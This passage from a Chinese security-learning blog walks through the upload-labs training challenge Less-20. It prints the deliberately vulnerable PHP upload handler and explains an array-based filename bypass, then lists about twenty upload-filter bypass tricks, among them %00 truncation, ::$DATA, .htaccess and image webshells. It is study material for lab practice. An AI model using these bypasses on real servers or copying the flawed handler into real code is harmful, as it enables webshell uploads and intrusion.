<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><blockquote>
<p>对文件名处理漏洞</p>
</blockquote>
<p>本道题在代码在<code>2019 unctf</code>的<code>simple_upload</code>出现了，关键在于<code>end()、reset()、count()</code>函数处理的不当，导致绕过。</p>
<p>先做个简单测试</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-1.png" alt></p>
<p>这题的关键点在于<code>move_uploaded_file()</code>函数会自动递归删除最后的<code>/.</code>字符串（或者 Windows 环境下自动删除文件名最后的<code>.</code>）</p>
<pre><code class="php">move_uploaded_file($temp_name, $img_path)
</code></pre>
<p>当我们有传入<code>$_POST[&#39;save_name&#39;]</code>时，并且是一个数组，<code>$file</code>这个变量就可以是一个数组，并且内容随意控制，无需受<code>explode()</code>控制，思路：</p>
<p>① 令数组的最后一个参数为允许的后缀，比如 png</p>
<p>② 令<code>$file[count($file) - 1]</code>为空，这样<code>$file_name</code>等于“数组的第一位 + <code>.</code>”，然后我们使数组的第一位为“文件名 + <code>/</code>”，这样传入 move_uploaded_file() 函数中时，就是“文件名 + <code>/.</code>”，后面的<code>/.</code>就会被处理掉。看一下 count() 对数组处理的漏洞，对没有赋值的数组元素不计算，所以可以利用这一点来使得<code>$file[count($file) - 1]</code>为空</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/UNCTF/5-3.png" alt></p>
<p>以上是一种处理方法，如果面对的服务器是搭建在 Windwos 上的，我们可以忽略<code>/</code>，因为 Windwos 本来就会处理掉文件最后面的<code>.</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-1.png" alt></p>
<p>可以访问并解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/20-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if(!empty($_FILES[&#39;upload_file&#39;])){
    //检查MIME
    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);
    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type)){
        $msg = &quot;禁止上传该类型文件!&quot;;
    }else{
        //检查文件名
        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];
        if (!is_array($file)) {
            $file = explode(&#39;.&#39;, strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
        if (!in_array($ext, $allow_suffix)) {
            $msg = &quot;禁止上传该后缀文件!&quot;;
        }else{
            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = &quot;文件上传成功！&quot;;
                $is_upload = true;
            } else {
                $msg = &quot;文件上传失败！&quot;;
            }
        }
    }
}else{
    $msg = &quot;请选择要上传的文件！&quot;;
}
</code></pre>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
<p>① 抓包修改文件后缀（绕过前端验证）</p>
<p>② 抓包修改 Content-Type 字段</p>
<p>③ 针对黑名单，修改文件后缀为 php3、php5、phtml、php.xxx 等常见绕过黑名单的后缀</p>
<p>④ 上传 .htaccess 使所有类型文件都解析为 php 文件，然后上传黑名单之外的文件类型</p>
<p>⑤ 对后缀名没有进行“小写化”处理，可以用 大小写 绕过黑名单（PHP）</p>
<p>⑥ 对后缀名没有进行“去空格”处理，可以用 添加空格 绕过黑名单（.php ）</p>
<p>⑦ 对后缀名没有进行“去点(.)处理”，可以用 尾部添加. 绕过黑名单（.php.）</p>
<p>⑧ 没有对后缀名进行“去 ::$DATA 处理”，可以用尾部添加 ::$DATA 绕过黑名单（.php::$DATA）</p>
<p>⑨ 将 后缀检查 和 上传路径中的文件名 分开的逻辑漏洞，可以构造后缀绕过黑名单构造文件名（.php. .）</p>
<p>⑩ 关键处使用 str_replace() 函数，因为只匹配一次所以可以双写绕过</p>
<p>①① move_uploaded_file() 的 %00 截断（CVE-2015-2348）导致上传文件名随意控制</p>
<p>①② %00 如果通过 POST 方式传递，由于 POST 方式不会自动 URL解码 ，所以需要将 %00 编码后传入</p>
<p>①③ 上传图片马 + 本地文件包含 拿到 shell</p>
<p>①④ getimagesize()、image_type_to_extension() 绕过方法同 13 关</p>
<p>①⑤ exif_imagetype() 绕过方法同 13 关</p>
<p>①⑥ 方法一：观察 未上传图片 与 上传后的图片 的相同处，修改相同处为php代码；方法二：大佬的脚本</p>
<p>①⑦ 先上传，判断后缀不正确后再删除：通过条件竞争访问</p>
<p>①⑧ 图片马 + 条件竞争</p>
<p>①⑨ move_uploaded_file() 的 %00 截断（CVE-2015-2348）</p>
<p>②〇 文件名处理漏洞</p>
</blockquote>
<hr>
<p><strong>Reference</strong></p>
<p><a href="https://xz.aliyun.com/t/2435#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/2435#toc-8</a> </p>
<p><a href="https://blog.csdn.net/u011377996/article/details/86776198" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/86776198</a></p>
<p><a href="http://www.admintony.com/%e5%85%b3%e4%ba%8e%e4%b8%8a%e4%bc%a0%e4%b8%ad%e7%9a%8400%e6%88%aa%e6%96%ad%e5%88%86%e6%9e%90.html" target="_blank" rel="noopener">http://www.admintony.com/%e5%85%b3%e4%ba%8e%e4%b8%8a%e4%bc%a0%e4%b8%ad%e7%9a%8400%e6%88%aa%e6%96%ad%e5%88%86%e6%9e%90.html</a></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls"
                data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
            <ul id="audio-list" style="display:none">
                
                
                <li title='0' data-url='/knlvre.github.io/statics/YoungAndBeautiful.mp3'></li>
                
                    
            </ul>
            
            
            
    <div id='gitalk-container' class="comment link"
        data-ae='true'
        data-ci='ec894e2b66f752e8b7fb'
        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
        data-r='blog-comments'
        data-o='TriDiamond'
        data-a='TriDiamond'
        data-d=''
    >Comments</div>


            
            
        </div>
        <div class="sidebar">
            <div class="box animated fadeInRight">
                <div class="subbox">
                    <img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ico/HaZong.jpg" height=300 width=300></img>
                    <p>Knlvre</p>
                    <span>Notes During Information Security Learning.</span>
                    <dl>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-github"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-twitter"></span></a></dd>
                        <dd><a href="https://github.com/knlvre" target="_blank"><span
                                    class=" iconfont icon-stack-overflow"></span></a></dd>
                    </dl>
                </div>
                <ul>
                    <li><a href="/">65 <p>Articles</p></a></li>
                    <li><a href="/categories">0 <p>Categories</p></a></li>
                    <li><a href="/tags">9 <p>Tags</p></a></li>
                </ul>
            </div>
            
            
            
            <div class="box sticky animated fadeInRight faster">
                <div id="toc" class="subbox">
                    <h4>Contents</h4>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11"><span class="toc-number">11.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-12"><span class="toc-number">12.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-13"><span class="toc-number">13.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-14"><span class="toc-number">14.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-15"><span class="toc-number">15.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-16"><span class="toc-number">16.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-17"><span class="toc-number">17.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-18"><span class="toc-number">18.</span> <span class="toc-text">Less-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-19"><span class="toc-number">19.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-20"><span class="toc-number">20.</span> <span class="toc-text">Less-20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">21.</span> <span class="toc-text">思路</span></a></li></ol>
                </div>
            </div>
            
            
        </div>
    </div>
</div>

    </div>
</div>
    <div id="back-to-top" class="animated fadeIn faster">
        <div class="flow"></div>
        <span class="percentage animated fadeIn faster">0%</span>
        <span class="iconfont icon-top02 animated fadeIn faster"></span>
    </div>
</body>
<footer>
    <p class="copyright" id="copyright">
        &copy; 2020
        <span class="gradient-text">
            Knlvre
        </span>.
        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
        Theme
        <span class="gradient-text">
            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
        </span>
        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
    </p>
</footer>

<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<script>
  MathJax.Hub.Config({
    "HTML-CSS": {
      preferredFont: "TeX",
      availableFonts: ["STIX", "TeX"],
      linebreaks: {
        automatic: true
      },
      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
      inlineMath: [
        ["$", "$"],
        ["\\(", "\\)"]
      ],
      processEscapes: true,
      ignoreClass: "tex2jax_ignore|dno",
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
      noUndefined: {
        attributes: {
          mathcolor: "red",
          mathbackground: "#FFEEEE",
          mathsize: "90%"
        }
      },
      Macros: {
        href: "{}"
      }
    },
    messageStyle: "none"
  });
</script>
<script>
  function initialMathJax() {
    MathJax.Hub.Queue(function () {
      var all = MathJax.Hub.getAllJax(),
        i;
      // console.log(all);
      for (i = 0; i < all.length; i += 1) {
        console.log(all[i].SourceElement().parentNode)
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  }

  function reprocessMathJax() {
    if (typeof MathJax !== 'undefined') {
      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
    }
  }
</script>



    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="/knlvre.github.io/js/plugin.js"></script>
<script src="/knlvre.github.io/js/obsidian.js"></script>
<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
<script src="/knlvre.github.io/js/search.js"></script>
<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>

    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>



    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
    <script>
        $(document).ready(function () {
            if ($('span[id^="busuanzi_"]').length) {
                initialBusuanzi();
            }
        });
    </script>


<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
